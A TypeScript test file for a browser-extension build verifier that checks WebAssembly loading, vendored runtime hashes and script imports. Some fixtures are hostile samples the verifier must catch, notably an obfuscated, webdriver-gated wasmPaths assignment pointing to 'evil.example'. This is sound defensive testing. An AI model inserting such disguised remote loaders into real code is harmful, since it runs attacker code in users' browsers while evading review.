      ['a reference to another .wasm', 'fetch("https://cdn.example.com/x.wasm")'],
    ])('rejects %s in a chunk, the service worker and the injected script', (_name, code) => {
      for (const file of [RESULT, 'assets/x-abc.js', 'background.js', 'select.js']) {
        expect(problemsOf({ [file]: code }), `${file}: ${code}`).toContain('WebAssembly module');
      }
    });

    it.each([
      ['a string URL', 'o.env.wasm.wasmPaths="https://cdn.example.com/ort/"'],
      ['an object', 'o.env.wasm.wasmPaths={wasm:"https://cdn.example.com/x.wasm",mjs:u}'],
      ['a second setting', `${LEGIT};${LEGIT}`],
      [
        'a decoded, environment-dependent string (the review of PR #6)',
        LEGIT.replace(
          '.wasm.wasmPaths=I()',
          '.wasm.wasmPaths=decodeURI("getManifest"in chrome.runtime&&!navigator.webdriver?"%68ttps://evil.example/ort/":I())',
        ),
      ],
      [
        'a frozen object with a remote .wasm',
        LEGIT.replace(
          '.wasm.wasmPaths=I()',
          '.wasm.wasmPaths=Object.freeze({mjs:I(),wasm:"https://evil.example/x"})',
        ),
      ],
      ['any other call', LEGIT.replace('.wasm.wasmPaths=I()', '.wasm.wasmPaths=g()')],
    ])('rejects wasmPaths set from %s', (_name, code) => {
      const rhs = code.startsWith('import') ? code : code;
      expect(problemsOf({ [RESULT]: rhs })).toContain('wasmPaths');
    });

    it('rejects wasmPaths outside the result chunk, and wasmBinary anywhere', () => {
      expect(problemsOf({ 'assets/welcome-abc.js': 'o.env.wasm.wasmPaths=I()' })).toContain(
        'wasmPaths',
      );
      expect(problemsOf({ 'background.js': 'o.env.wasm.wasmPaths=I()' })).toContain('wasmPaths');
      expect(
        problemsOf({ [RESULT]: 'o.env.wasm.wasmBinary=await(await fetch(u)).arrayBuffer()' }),
      ).toContain('wasmBinary');
      expect(problemsOf({ 'select.js': 'x.wasmBinary=b' })).toContain('wasmBinary');
    });

    describe('the vendor files are exempt by exact path and sha256, not by prefix', () => {
      const WITH_HEADER =
        'new Uint8Array([0,97,115,109]);o.env.wasm.wasmPaths="x";o.env.wasm.wasmBinary=b';

      function vendorWith(path: string, text: string) {
        const bytes = Buffer.from(text);
        const vendor = new Map(FAKE_VENDOR);
        vendor.set(path, {
          source: 'unused',
          sha256: createHash('sha256').update(bytes).digest('hex'),
          size: bytes.length,
        });
        return { vendor, bytes };
      }

      it('does not scan ort/ort.wasm.min.mjs when it is the pinned file (the real one has such code)', () => {
        const { vendor, bytes } = vendorWith('ort/ort.wasm.min.mjs', WITH_HEADER);
        const dir = makeDist({ files: { 'ort/ort.wasm.min.mjs': bytes } });
        expect(verifyDist(dir, { ...release, vendor })).toEqual([]);
      });

      it('scans it when its bytes are not the pinned ones', () => {
        const dir = makeDist({ files: { 'ort/ort.wasm.min.mjs': WITH_HEADER } });
        const problems = verifyDist(dir, release).join('\n');
        expect(problems).toContain('ort/ort.wasm.min.mjs has size');
        expect(problems).toContain('ort/ort.wasm.min.mjs: carries a WebAssembly module');
        expect(problems).toContain('wasmBinary');
      });

      it.each([
        'ort/other.mjs',
        'ort/other.js',
        'assets/ort/ort.wasm.min.mjs',
        'ort/sub/ort.wasm.min.mjs',
        'model/x.js',
        'ORT/ort.wasm.min.mjs',
      ])('gives %s no exemption', (file) => {
        const dir = makeDist({ files: { [file]: WITH_HEADER } });
        const bundles = withMain({ [file]: 'asset' });
        const problems = verifyDist(dir, bundles).join('\n');
        expect(problems).toContain(`${file}: carries a WebAssembly module`);
      });
    });
  });

  describe('imports between the built scripts', () => {
    const ORT_IMPORT = 'import*as o from"../ort/ort.wasm.min.mjs";export{o};';

    it('accepts the vendored runtime imported from a chunk in assets/', () => {
      const files = { 'assets/result-abc.js': REAL_CHUNK };
      expect(
        verifyDist(
          makeDist({ files, skip: [BASE_CHUNK] }),
          withMain({ 'assets/result-abc.js': 'chunk' }),
        ),
      ).toEqual([]);
    });

    it('rejects a chunk that imports the runtime and does not configure it (its defaults would apply)', () => {
      const files = { 'assets/result-abc.js': ORT_IMPORT };
      const problems = verifyDist(
        makeDist({ files, skip: [BASE_CHUNK] }),
        withMain({ 'assets/result-abc.js': 'chunk' }),
      ).join('\n');
      expect(problems).toContain('proxy must be assigned exactly once');
      expect(problems).toContain('start-up check');
    });

    it('rejects the same import from the service worker at the root (it would leave the extension)', () => {
      const dir = makeDist({ files: { 'background.js': ORT_IMPORT } });
      expect(verifyDist(dir, release).join('\n')).toContain(
        'background.js: imports ../ort/ort.wasm.min.mjs',
      );
    });

    it('rejects an import of a chunk the build does not have, in every spelling', () => {
      for (const code of [
        'import{a}from"./gone.js";',
        "import './gone.js';",
        "export * from '../gone.js';",
      ]) {
        const problems = verifyDist(makeDist({ files: { 'background.js': code } }), release).join(
          '\n',
        );
        expect(problems, code).toMatch(/background\.js: imports \.{1,2}\/gone\.js/);
      }
    });

    it('accepts imports of chunks that exist', () => {
      const files = {
        'background.js': 'import{a}from"./assets/x-abc.js";',
        'assets/x-abc.js': 'export const a=1;',
      };
      expect(verifyDist(makeDist({ files }), withMain({ 'assets/x-abc.js': 'chunk' }))).toEqual([]);
    });
  });

  describe('WebAssembly, models and runtime scripts', () => {
    it.each([
      ['a stray foo.wasm in the root', 'foo.wasm', 'asset'],
      ['a stray .wasm next to the runtime', 'ort/foo.wasm', 'asset'],
      ['a .wasm among the page assets', 'assets/runtime.wasm', 'asset'],
      ['a .wasm with an upper-case name', 'ORT/ort-wasm-simd-threaded.WASM', 'asset'],
      ['a second .onnx model', 'model/other.onnx', 'asset'],
      ['an .onnx model in the root', 'model.onnx', 'asset'],
      ['an unlisted script below ort/', 'ort/extra.mjs', 'asset'],
      ['an unlisted file below model/', 'model/notes.json', 'asset'],
      ['the runtime wasm under another directory', 'assets/ort-wasm-simd-threaded.wasm', 'asset'],
    ] as const)('rejects %s', (_what, file, kind) => {
      const dir = makeDist({ files: { [file]: 'x' } });
      const problems = verifyDist(dir, withMain({ [file]: kind })).join('\n');
      expect(problems).toContain(file);
    });

    it('rejects a .wasm the bundler did not report even at a listed path', () => {
      const path = 'ort/ort-wasm-simd-threaded.wasm';
      const main = Object.fromEntries(Object.entries(MAIN).filter(([file]) => file !== path));
      const problems = verifyDist(makeDist(), { ...release, bundles: { main, content: CONTENT } });
      expect(problems.join('\n')).toContain(`${path}: `);
    });

    it.each([
      ['the WebAssembly runtime', 'ort/ort-wasm-simd-threaded.wasm'],
      ['the runtime loader', 'ort/ort-wasm-simd-threaded.mjs'],
      ['the runtime entry', 'ort/ort.wasm.min.mjs'],
      ['the model', 'model/model_fp16.onnx'],
      ['the family table', 'model/meta.json'],
    ])('rejects one changed byte in %s', (_what, path) => {
      const bytes = Buffer.from(VENDOR_BYTES.get(path) ?? '');
      bytes[0] = (bytes[0] ?? 0) ^ 1;
      const problems = verifyDist(makeDist({ files: { [path]: bytes } }), release).join('\n');
      expect(problems).toContain(path);
      expect(problems).toMatch(/sha256/);
    });

    it('rejects a pinned file that is missing from the build', () => {
      const problems = verifyDist(makeDist({ skip: ['model/model_fp16.onnx'] }), release).join(
        '\n',
      );
      expect(problems).toContain('model/model_fp16.onnx');
    });

    it('rejects a Git LFS pointer in place of the model', () => {
      const pointer = 'version https://git-lfs.github.com/spec/v1\noid sha256:00\nsize 1\n';
      const problems = verifyDist(
        makeDist({ files: { 'model/model_fp16.onnx': pointer } }),
        release,
      ).join('\n');
      expect(problems).toMatch(/model_fp16\.onnx[\s\S]*git lfs pull/);
    });

    it('checks the real pinned list by default: a dist of stand-in bytes fails for every vendor file', () => {
      const problems = verifyDist(makeDist(), {
        e2e: false,
        version: VERSION,
        bundles: BUNDLES,
      }).join('\n');
      for (const path of VENDOR_FILES.keys()) expect(problems).toContain(path);
    });

    it('rejects a vendor file that is also an emitted chunk (it must be a copied asset)', () => {
      const bundles = withMain({ 'ort/ort.wasm.min.mjs': 'chunk' });
      expect(verifyDist(makeDist(), bundles).join('\n')).toContain('ort/ort.wasm.min.mjs');
    });
  });
});
